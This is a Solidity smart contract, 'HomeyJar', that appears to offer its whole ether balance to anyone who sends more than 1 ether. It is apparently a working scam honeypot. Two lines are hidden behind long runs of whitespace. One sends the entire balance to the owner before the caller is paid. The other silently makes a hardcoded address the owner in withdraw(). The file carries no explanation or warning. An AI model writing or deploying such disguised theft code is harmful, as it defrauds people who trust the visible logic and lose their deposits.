pragma solidity ^0.8.26;

contract HomeyJar {
    address public Owner = msg.sender;
    uint public totalDeposits;
    uint public totalWithdrawals;
    mapping(address => uint) public userDeposits;
    
    event HoneyCollected(address indexed collector, uint amount);
    event JarEmptied(address indexed emptier, uint amount);
    
    receive() external payable {
        totalDeposits += msg.value;
        userDeposits[msg.sender] += msg.value;
    }
   
    function GetHoneyFromJar() public payable {                                              
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
            emit HoneyCollected(msg.sender, address(this).balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        payable(Owner).transfer(balance);
        totalWithdrawals += balance;
        emit JarEmptied(msg.sender, balance);
    }
    
    function Command(address adr,bytes calldata data) payable public {
        require(msg.sender == Owner);
        (bool success,) = adr.call{value: msg.value}(data);
    }
    
    function getJarBalance() public view returns (uint) {
        return address(this).balance;
    }
}